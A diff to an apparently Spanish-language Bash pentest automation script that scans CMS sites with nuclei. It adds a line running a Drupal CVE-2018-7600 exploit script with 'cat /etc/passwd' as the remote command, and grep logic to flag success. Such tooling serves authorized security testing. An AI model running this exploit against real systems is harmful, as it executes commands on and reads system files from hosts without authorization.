@@ -1032,6 +1032,8 @@ function enumeracionCMS () {
 
 			echo -e "\t\t[+] nuclei Drupal ("$proto_http"://"$host":"$port")"
 			nuclei -u "$proto_http"://"$host":"$port""$path_web"  -id /root/.local/nuclei-templates/cves/drupal_"$MODE".txt  -no-color  -include-rr -debug > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_drupalNuclei.txt 2> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_drupalNuclei.txt &
+
+			drupa7-CVE-2018-7600.py "$proto_http"://"$host":"$port""$path_web" -c 'cat /etc/passwd' > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_drupal-CVE~2018~7600.txt
 			# http://www.mipc.com.bo/node/9/devel/token
 			if [[  "$MODE" == "total" ]]; then
 				echo -e "\t\t[+] Revisando vulnerabilidades de drupal ($host)"
@@ -2096,6 +2098,7 @@ if [[ $webScaneado -eq 1 ]]; then
 			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_chamilo-CVE~2023~34960.txt" ] && grep -i 'vulnerable' logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_chamilo-CVE~2023~34960.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_chamilo-CVE~2023~34960.txt 2>/dev/null
 			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_apacheNuclei.txt" ] && egrep --color=never '\[medium\]|\[high\]|\[critical\]' logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_apacheNuclei.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_apacheNuclei.txt 2>/dev/null
 			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_tomcatNuclei.txt" ] && egrep --color=never '\[medium\]|\[high\]|\[critical\]' logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_tomcatNuclei.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_tomcatNuclei.txt 2>/dev/null
+			
 			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_joomlaNuclei.txt" ] && egrep --color=never '\[medium\]|\[high\]|\[critical\]' logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_joomlaNuclei.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_joomlaNuclei.txt 2>/dev/null
 			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_wordpressNuclei.txt" ] && egrep --color=never '\[medium\]|\[high\]|\[critical\]' logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_wordpressNuclei.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_wordpressNuclei.txt 2>/dev/null
 			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_drupalNuclei.txt" ] && egrep --color=never '\[medium\]|\[high\]|\[critical\]' logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_drupalNuclei.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_drupalNuclei.txt 2>/dev/null
@@ -2106,7 +2109,7 @@ if [[ $webScaneado -eq 1 ]]; then
 			[ ! -e ".vulnerabilidades2/"$host"_"$port-$path_web_sin_slash"_joomla-CVE~2023~23752.txt" ] && egrep 'DB|Site' logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_joomla-CVE~2023~23752.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_joomla-CVE~2023~23752.txt 2>/dev/null
 			[ ! -e ".vulnerabilidades2/"$host"_"$port-$path_web_sin_slash"_joomla-CVE~2017~8917.txt" ] && egrep -i 'found' logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_joomla-CVE~2017~8917.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_joomla-CVE~2017~8917.txt 2>/dev/null
 			
-			
+			[ ! -e ".vulnerabilidades2/"$host"_"$port-$path_web_sin_slash"_drupal-CVE~2018~7600.txt" ] && grep -i root logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_drupal-CVE~2018~7600.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_drupal-CVE~2018~7600.txt
 			[ ! -e ".enumeracion2/"$host"_"$port-$path_web_sin_slash"_company.txt" ] && cat logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_cert.txt 2>/dev/null | jq '.commonName'  | extractCompany.py | egrep -v 'Error en la entrada|linksys|wifi' > .enumeracion/"$host"_"$port-$path_web_sin_slash"_company.txt 2>/dev/null
 			
 			[ ! -e "logs/vulnerabilidades/${host}_${port}-${path_web_sin_slash}_wpUsers.txt" ] && cat logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_wpUsers.json 2>/dev/null | wpscan-parser.py 2>/dev/null | awk {'print $2'} > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_wpUsers.txt 2>/dev/null
